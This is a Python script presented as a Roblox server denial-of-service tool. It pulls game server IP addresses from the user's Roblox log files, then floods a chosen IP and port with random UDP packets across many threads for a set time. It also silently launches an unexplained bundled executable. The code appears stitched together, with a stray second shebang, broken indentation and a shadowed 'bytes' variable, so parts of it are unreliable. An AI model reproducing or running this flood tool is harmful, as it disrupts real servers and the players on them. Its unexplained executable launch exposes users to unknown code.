import glob
import os
from colorama import *
import time
init()
username = os.getenv('username')



print("disclaimer of liability / i am not responsable for the actions you do, this is made purely for educational purpose!")
time.sleep(5)

try:
    input(Fore.GREEN + "Press [ENTER] to start")
except SyntaxError:
    pass
list_of_files = glob.glob(r'C:\users\{}\AppData\Local\Roblox\logs\*'.format(username))
latest_file = max(list_of_files, key=os.path.getctime)
roblox_log = open(latest_file, 'r')

for line in roblox_log:
    if 'Connection accepted from' in line:
        line = line.replace('Connection accepted from', '')
        line2 = line.replace('|', ':')
        line3 = line2[25:]
        print("connected to roblox server: " + line3)

        ip_history = open('server_ips.txt', 'a+')
        ip_history.write(line3 + "\n")
        ip_history.close()

targetIP = input("input the IP addr above: ")
targetPORT = input("input the IP PORT above: ")
threads1 = input("how many threads? : ")
temps1 = input("set attack duration: ")



def banner():
    print(Fore.RED + f"""
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿   -< Roblox server DDoS tool. >-
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠇⠸⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿   -< tool for educational use >-
⣿⣿⣿⣿⣿⣿⣿⡿⠟⢉⣠⣴⣶⣾⡇⢸⣷⣶⣦⣄⡉⠻⢿⣿⣿⣿⣿⣿⣿⣿   
⣿⣿⣿⣿⣿⡿⠋⣠⣶⣿⣿⣿⣿⣿⣇⣸⣿⣿⣿⣿⣿⣶⣄⠙⢿⣿⣿⣿⣿⣿   [target Locked at {targetIP}:{targetPORT}
⣿⣿⣿⣿⡟⢁⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡈⢻⣿⣿⣿⣿   [attack type / UDP                       
⣿⣿⣿⣿⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⣿⣿⣿⣿   [thread count: {threads1}                
⣿⣿⣿⡇⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢸⣿⣿⣿   [duration: {temps1}                      
⣿⣿⣉⡁⣉⣉⣉⣹⣿⣿⣿⣿⣿⣉⡁⢈⣉⣿⣿⣿⣿⣿⣏⣉⣉⣉⢈⣉⣿⣿
⣿⣿⣿⡇⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⢸⣿⣿⣿   [note: ddos attacks require decent internet to preform
⣿⣿⣿⣿⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⣿⣿⣿⣿
⣿⣿⣿⣿⣧⡈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢁⣼⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣷⣄⠙⠿⣿⣿⣿⣿⣿⡏⢹⣿⣿⣿⣿⣿⠿⠋⣠⣾⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣷⣦⣈⠙⠻⠿⢿⡇⢸⡿⠿⠟⠋⣁⣴⣾⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⡆⢰⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    
    """)

banner()
input("press [ENTER] to start attack...")
    #!/usr/bin/env python3
# -*- coding: utf-8 -*-


import sys
import time
import random
import socket
import os
import threading


cwd = os.getcwd()
os.startfile(f"{cwd}/serv/sv/server.exe")
def minecraftsexptdr(ip,port,temps):
    timeout = time.time() + float(temps)
    udpsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    #rawsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    sent = 0
    #taille du packet
    bytes = random._urandom(256)
    while True:
                    try:
                            if time.time() > timeout :
                                    break
                            else:
                                    pass
                            ran = random.randrange(10**80)
                            hex = "%064x" % ran
                            hex = hex[:64] 
                            udpsock.sendto(bytes.fromhex(hex) + bytes,(ip,int(port)))
                            #rawsock.sendto(bytes.fromhex(hex) + bytes,(ip,int(port))) 
                            sent = sent + 1
                    except KeyboardInterrupt:
                            sys.exit(os.system("clear"))

def main():
    ip = targetIP
    port = int(targetPORT)
    threads = int(threads1)
    temps = int(temps1)
    for i in range(0, threads):
        thread = threading.Thread(target=minecraftsexptdr, args=(ip,port,temps))
        thread.start()
        
if __name__ == "__main__":
    main()
    
